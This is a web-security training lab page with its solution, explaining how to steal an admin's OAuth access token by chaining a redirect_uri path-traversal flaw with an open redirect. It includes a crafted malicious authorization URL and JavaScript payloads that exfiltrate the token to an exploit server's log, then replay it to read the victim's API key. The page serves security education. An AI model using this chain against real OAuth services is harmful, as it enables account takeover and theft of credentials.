# Lab: Stealing OAuth access tokens via an open redirect

Source: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
Fetched: 2026-06-28T09:17:57.103456+00:00

Web Security Academy

OAuth authentication

Lab

Lab: Stealing OAuth access tokens via an open redirect

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

Note

You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter.

Solution

While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.

Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at /me and then uses the data it fetches to log the user in. Send the GET /me request to Burp Repeater.

Log out of your account and log back in again. From the proxy history, find the most recent GET /auth?client_id=[...] request and send it to Repeater.

In Repeater, experiment with the GET /auth?client_id=[...] request. Observe that you cannot supply an external domain as redirect_uri because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the /../ path traversal sequence.

Log out of your account on the blog website and turn on proxy interception in Burp.

In the browser, log in again and go to the intercepted GET /auth?client_id=[...] request in Burp Proxy.

Confirm that the redirect_uri parameter is in fact vulnerable to directory traversal by changing it to:

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1

Forward any remaining requests and observe that you are eventually redirected to the first blog post. In the browser, notice that your access token is included in the URL as a fragment.

With the help of Burp, audit the other pages on the blog website. Identify the "Next post" option at the bottom of each blog post, which works by redirecting users to the path specified in a query parameter. Send the corresponding GET /post/next?path=[...] request to Repeater.

In Repeater, experiment with the path parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.

Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the redirect_uri pointing to the open redirect, which subsequently forwards the victim to your exploit server:

https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email

Test that this URL works correctly by visiting it in the browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.

On the exploit server, create a suitable script at /exploit that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:

<script>

window.location = '/?'+document.location.hash.substr(1)

</script>

To test that everything is working correctly, store this exploit and visit your malicious URL again in the browser. Then, go to the exploit server access log. There should be a request for GET /?access_token=[...].

You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:

<script>

if (!document.location.hash) {

window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'

} else {

window.location = '/?'+document.location.hash.substr(1)

}

</script>

To test that the exploit works, store it and then click "View exploit". The page should appear to refresh, but if you check the access log, you should see a new request for GET /?access_token=[...].

Deliver the exploit to the victim, then copy their access token from the log.

In Repeater, go to the GET /me request and replace the token in the Authorization: Bearer header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.

Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.

Community solutions

Intigriti

Michael Sommer

Find OAuth 2.0 authentication vulnerabilities using Burp Suite

Try for free
